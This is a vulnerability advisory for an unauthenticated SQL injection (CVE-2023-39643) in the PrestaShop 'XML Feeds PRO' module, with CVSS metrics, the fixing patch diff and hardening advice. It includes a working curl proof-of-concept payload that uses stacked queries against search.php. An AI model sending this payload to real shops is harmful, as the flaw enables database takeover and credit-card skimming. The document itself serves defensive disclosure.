In the module "XML Feeds PRO" (xmlfeeds) up to versions 3.8.2 from Bl Modules for PrestaShop, a guest can perform SQL injection in affected versions.


## Summary

* **CVE ID**: [CVE-2023-39643](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39643)
* **Published at**: 2023-08-29
* **Platform**: PrestaShop
* **Product**: xmlfeeds
* **Impacted release**: <= 3.8.2 (3.9.8 fixed the vulnerability)
* **Product author**: Bl Modules
* **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
* **Severity**: critical (9.8)

## Description

The method `SearchApiXml::Xmlfeeds()` has sensitive SQL calls that can be executed with a trivial http call and exploited to forge a SQL injection.

**WARNING** : This exploit is actively used to deploy webskimmer to massively steal credit cards. 

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Possible malicious usage

* Obtain admin access
* Remove data from the associated PrestaShop
* Copy/paste data from sensitive tables to FRONT to expose tokens and unlock admins's ajax scripts
* Rewrite SMTP settings to hijack emails


## Proof of concept


```bash
curl -v 'https://preprod.X/modules/xmlfeeds/search.php?s=1&s_p=1);select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--'
```

## Patch from 3.8.2

```diff
--- 3.8.2/modules/xmlfeeds/xmlfeeds.php
+++ 3.9.8/modules/xmlfeeds/xmlfeeds.php
$moduleImgPath = '../modules/xmlfeeds/views/img/';

        if (!empty($selected_products) && $selected_products != 'undefined') {
-           $where_selected = ' AND l.id_product NOT IN ('.$selected_products.')';
+           $where_selected = ' AND l.id_product NOT IN ('.implode(',', array_map('intval', explode(',', $selected_products))).')';
        }

```

## Other recommendations

* It’s recommended to upgrade to the latest version of the module **xmlfeeds**.
* Upgrade PrestaShop to the latest version to disable multiquery executions (separated by “;”) - be warned that this functionality **WILL NOT** protect your SHOP against injection SQL which uses the UNION clause to steal data.
* Change the default database prefix `ps_` with a new longer, arbitrary prefix. Nevertheless, be warned that this is useless against blackhats with DBA senior skills because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against this set of rules.
